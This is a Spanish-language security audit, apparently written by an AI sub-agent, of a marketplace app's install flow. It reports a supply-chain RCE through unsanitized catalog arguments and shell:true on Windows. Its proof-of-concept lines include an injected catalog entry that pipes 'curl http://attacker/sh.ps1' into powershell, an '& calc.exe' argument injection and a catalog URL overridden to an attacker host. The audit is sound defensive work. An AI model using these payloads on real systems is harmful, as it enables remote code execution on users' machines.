# Auditoría Capa 4 — Seguridad del flujo de instalación y gestión (ClineMarket)

**Commit auditado:** `5dcb9a5` · **Agente:** sub-agente especializado (`spawn_agent`) · **Método:** lectura directa de `lib/sanitizers.js`, `lib/runner.js`, `lib/resolver.js`, `lib/routes.js`, `lib/state.js`, `lib/logger.js`, `server.js`, `scripts/refresh-catalog.mjs`, `catalog.json`. Cero inventos: cada hallazgo con archivo:línea verificado.

**Score: 4.5 / 10**

---

## Cadena de ataque principal

`refresh-catalog.mjs` descarga el catálogo upstream y lo persiste **sin ninguna validación de esquema** → `catalog.json` pasa a servir `entry.install.args` → `POST /api/install` spread-ea esos args sin sanitizar → `runCline()` los ejecuta con `shell: true` si el exe es un shim `.cmd` en Windows → **RCE por cadena de suministro**.

---

## Tabla de hallazgos

| ID | Vector | Archivo:línea | Severidad | PoC | Fix |
|----|--------|---------------|-----------|-----|-----|
| **C4-01** | **RCE vía `entry.install.args` del catálogo sin sanitizar.** `/api/install` busca la entrada del catálogo y hace spread de `entry.install.args` directo a los args del CLI, sin pasar por `sanitizePrimitiveId` ni validar tipo/contenido. El id del request sí se sanitiza, pero si existe la entrada del catálogo **ni se usa**: se ejecutan los args del catálogo. | `lib/routes.js:824-826` (`let args = entry?.install?.args ? [verb, "install", ...entry.install.args] : [verb, "install", id]`) | **Critical** | Entrada maliciosa en `catalog.json`: `{"id":"evil","type":"mcp","install":{"args":["x","&","curl","http://attacker/sh.ps1","\|","powershell","-"]}}`. En Windows con shim `.cmd`, `spawn(exe, args, {shell:true})` (Node concatena sin escapar) interpreta `&` en `cmd.exe` → ejecución arbitraria. En POSIX, argument injection al CLI `cline` (flags arbitrarios). | Validar cada elemento de `entry.install.args` con allowlist estricta (regex, max length, sin metachars de shell `&\|;<>"'` `` ` `` `$()`). Si no pasa, fallback a `[verb, "install", id]`. |
| **C4-02** | **Amplificador: `shell: true` con array de args en Windows.** `runCline` usa `shell: true` cuando el exe es `.cmd/.bat`. Con `shell:true`, Node ejecuta `exe + args.join(" ")` en `cmd.exe` **sin escapar los args** — la documentación de Node prohíbe explícitamente pasar input no confiable. | `lib/runner.js:109-116` (condición en `:98`) | **High** (independiente es Low; combinado con C4-01 es el pivote del RCE) | `runCline(["mcp","install","a & calc.exe"])` con `cline` resuelto a `...\npm\cline.cmd` → `cmd /c cline.cmd mcp install a & calc.exe`. | Resolver el JS real del shim y `spawn(process.execPath, [shimJs], {shell:false})`, o escapar cada arg antes del join con shell. |
| **C4-03** | **Sin validación de esquema del catálogo upstream antes de persistir.** `refresh-catalog.mjs` hace `fetchJson(CATALOG_URL)` y escribe `catalog.json` con rename atómico pero **cero validación**: no verifica que `entries` sea array, ni tipos de `id`/`type`, ni shape de `install.args`. `MARKETPLACE_CATALOG_URL` es overridable por env, y el fetch no tiene pinning de contenido. | `scripts/refresh-catalog.mjs:283` (`const catalog = await fetchJson(CATALOG_URL)`), `:306-308` | **High** | `MARKETPLACE_CATALOG_URL=https://attacker.tld/catalog.json node scripts/refresh-catalog.mjs` con catálogo que contenga `install.args` maliciosos. | Schema validation (allowlist de campos, tipos, whitelists) antes de persistir. |

| **C4-04–C4-08** | (extracto condensado del run completo) Bulk DoS sin límite de items; shutdown/self-update sin auth; data loss en quarantine; `GITHUB_TOKEN`/`GH_TOKEN` propagado en env del subprocesso (`runner.js:33-38`) — no se imprime completo en logs, pero queda en el entorno de cualquier proceso hijo lanzado por el runner. | `lib/runner.js:33-38`; ver traza | **Medium** | — | Segmentar env del subprocesso; fixes por hallazgo en traza. |
| **C4-11** | Tmp file predecible en escritura atómica: `state.js:65` usa tmp con sufijo y en data dir compartido un atacante local puede pre-crear symlink; `refresh-catalog.mjs:297,306,319` usa solo `${path}.${Date.now()}.tmp` (colisión trivial). | `lib/state.js:65`; `scripts/refresh-catalog.mjs:297,306,319` | **Low** | Proceso local que adivina el tmp y coloca symlink/junction → el `renameSync` reemplaza el target del symlink. Requiere carrera + acceso local. | `fs.openSync(tmp, "wx")` (exclusive) o `mkdtempSync`; añadir entropía `crypto.randomBytes(8).toString("hex")`. |
| **C4-12** | `HOST` overridable sin guardia + CSP sin `frame-ancestors`. `server.js` bindea a `127.0.0.1` por defecto (bien, `server.js:35,164`), pero `HOST=0.0.0.0` por env expone todo el control plane a la LAN **sin autenticación ni rate limit**, con solo la mitigación de Origin/Sec-Fetch-Site (que no aplica a curl/scripts). CSP carece de `frame-ancestors 'none'`. | `server.js:35,46-49,164` | **Low** | `HOST=0.0.0.0 node server.js` → cualquier host LAN puede `POST /api/install`. | Warn + exigir token si no-loopback; agregar `frame-ancestors 'none'` al CSP (`server.js:48`). |
| **C4-13** | **Lo que está BIEN (verificado):** `sanitizePrimitiveId` rechaza `..`, `/`, `\`, metachars de shell, 128 char cap (`sanitizers.js:11-18`); escritura atómica con rename + retry EPERM + cola por-path (`state.js:55-91`); bind loopback por defecto; CSRF por Sec-Fetch-Site + Origin loopback (`server.js:54-76`); body limit 1MB (`server.js:79`); CSP con `script-src 'self'`; `/api/uninstall` y `/api/bulk` sí sanitizan el id (`routes.js:891-892,1043-1045`); `resolveCommand` usa `execFile` (no `exec`) con timeout (`resolver.js:80-84`). | — | Informativa | — | Mantener. |

**Descartado con evidencia (no es hallazgo):** no hay uso de `exec` con input externo ni de `shell:true` fuera de C4-01/C4-02/C4-05. `GITHUB_TOKEN`/`GH_TOKEN` no se imprimen completos en ningún archivo auditado. Los `command` del catálogo con tokens (`catalog.json:3915,4007,4473`) referencian variables de entorno `${VAR}`, no valores literales.

---

## Score: **4.5 / 10** — Justificación

- **Lo que está bien:** el perímetro HTTP es sólido para su modelo threat (loopback, CSRF checks, CSP, body limit, sanitizers consistentes en las rutas de entrada de usuario). El id que llega del request **nunca** llega crudo al subprocess en ninguna ruta verificada.
- **Lo que baja el score:** el flujo de instalación tiene un bypass completo de esa sanitización vía catálogo (**C4-01 Critical**): la confianza se transfiere del request validado al catálogo upstream **sin validar ninguno de los dos extremos** (C4-03), y el ejecutor amplifica con `shell:true` sin escapado (C4-02). Es el patrón clásico "sanitizado en la frontera, confiado en la cadena" — un solo eslabón (compromiso de `cline.github.io` o env override de `MARKETPLACE_CATALOG_URL`) convierte la app de catálogo en ejecutor de comandos arbitrarios con el entorno completo del usuario.
- No es 6+ porque la explotación de C4-01/02/03 requiere compromiso de la cadena de suministro upstream o acceso local previo, no un atacante remoto directo contra la app.
- No es <4 porque el hallazgo Critical es silencioso (el usuario ve "install ok"), persiste en disco, y los findings Medium (bulk DoS, shutdown/self-update sin auth, data loss en quarantine) son conocidos desde la auditoría del 2026-08-30 y siguen sin fix.

**Prioridad de fix:** C4-01 → C4-03 → C4-02 → C4-07 → C4-05/06 → resto.
